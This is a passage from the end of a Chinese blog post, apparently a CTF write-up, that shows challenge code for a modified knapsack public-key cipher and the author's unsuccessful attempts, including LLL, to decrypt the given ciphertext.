class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(Baglenth):<br>        di=(w*Bag[i])%m<br>        D.append(di)<br>        bindi=<span class="hljs-built_in">bin</span>(di)[<span class="hljs-number">2</span>:]<br>        bindi=pad(bindi,h)<br>        binD.append(bindi)<br>    U=[]<br>    V=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(Baglenth):<br>        tempu=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(binD[i][:j]),<span class="hljs-number">2</span>)<br>        U.append(tempu)<br>        tempv=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(binD[i][j:]),<span class="hljs-number">2</span>)<br>        V.append(tempv)<br>    e=gmpy2.next_prime(<span class="hljs-built_in">sum</span>(V))+<span class="hljs-number">2</span><br>    f=gmpy2.next_prime(<span class="hljs-built_in">sum</span>(U))<br>    <span class="hljs-keyword">assert</span> gmpy2.gcd(e,f)==<span class="hljs-number">1</span><br>    sk.append(<span class="hljs-built_in">int</span>(e))<br>    sk.append(<span class="hljs-built_in">int</span>(f))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(Baglenth):<br>        ai=e*U[i]+f*V[i]<br>        pk.append(<span class="hljs-built_in">int</span>(ai))<br>    <span class="hljs-keyword">return</span> pk,sk<br>Pk,Sk=keygen()<br><span class="hljs-built_in">print</span>(Pk)<br><span class="hljs-built_in">print</span>(Sk)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Encrypt</span>(<span class="hljs-params">plain,pk</span>):<br>    mbin=<span class="hljs-built_in">bin</span>(plain)[<span class="hljs-number">2</span>:]<br>    c=<span class="hljs-number">0</span><br>    mbin=pad(mbin,Baglenth)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(Baglenth):<br>        c=c+<span class="hljs-built_in">int</span>(mbin[i])*pk[i]<br>    <span class="hljs-keyword">return</span> c<br>c=Encrypt(message,Pk)<br><span class="hljs-built_in">print</span>(c)<br><br><span class="hljs-comment"># c = 1475864207352419823225329328555476398971654057144688193866218781853021651529290611526242518</span><br><br><span class="hljs-comment"># 这里print(sk,pk)输出的数据我没有复制过来。这个程序你跑一边就能得到那些数据了。</span><br></code></pre></td></tr></table></figure>
<p>找到了相关的资料：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43968080/article/details/102953485">https://blog.csdn.net/qq_43968080/article/details/102953485</a></p>
<p>可以看到代码中的Bag很明显符合这个超增量背包这个概念，说明这个魔改的背包公钥算法。而观察背包公钥算法的解密部分，需要的求一个逆让密文与这个逆进行模乘运算，最后使用超增量的方式进行贪心遍历即可得到解。</p>
<p>原本想了一下，Pk本身不就是一个超增量背包吗，不能直接进行排序求解吗，结果还真不行。</p>
<p>看一下sk都给了些什么，m,w和e,f都给了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(Baglenth):<br>    di=(w*Bag[i])%m<br>    D.append(di)<br>    bindi=<span class="hljs-built_in">bin</span>(di)[<span class="hljs-number">2</span>:]<br>    bindi=pad(bindi,h)<br>    binD.append(bindi)<br></code></pre></td></tr></table></figure>
<p>查了查资料想用LLL算法直接梭哈一把，可惜没能成功。(数学功底太差了，看不懂结果，我觉得答案应该在输出的结果中，但是我不知道是哪一个。)</p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
                    
                      <a class="hover-with-bg" href="/tags/writeup/">writeup</a>
                    
                      <a class="hover-with-bg" href="/tags/Crypto/">Crypto</a>
                    
                      <a class="hover-with-bg" href="/tags/MISC/">MISC</a>
                    
                      <a class="hover-with-bg" href="/tags/Reverse%EF%BC%8C-PWN%EF%BC%8C-Web/">Reverse， PWN， Web</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">
                  
                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
                  
                </p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2022/05/29/2022-CISCN-%E5%88%9D%E8%B5%9B/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">2022 CISCN 初赛</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022/05/22/%E5%8D%95%E8%BA%AB%E6%9D%AF-dsb-2022/">
                        <span class="hidden-mobile">单身杯(dsb) 2022</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- 不蒜子统计PV -->
        <span id="busuanzi_container_site_pv" style="display: none">
            总访问量 
            <span id="busuanzi_value_site_pv"></span>
             次
          </span>
      
      
        <!-- 不蒜子统计UV -->
        <span id="busuanzi_container_site_uv" style="display: none">
            总访客数 
            <span id="busuanzi_value_site_uv"></span>
             人
          </span>
      
    
  </div>


  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  <script  src="/js/local-search.js" ></script>



  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  
    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
  
  
    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
  



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
        typing(title);
      
    })(window, document);
  </script>















<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>


</body>
</html>
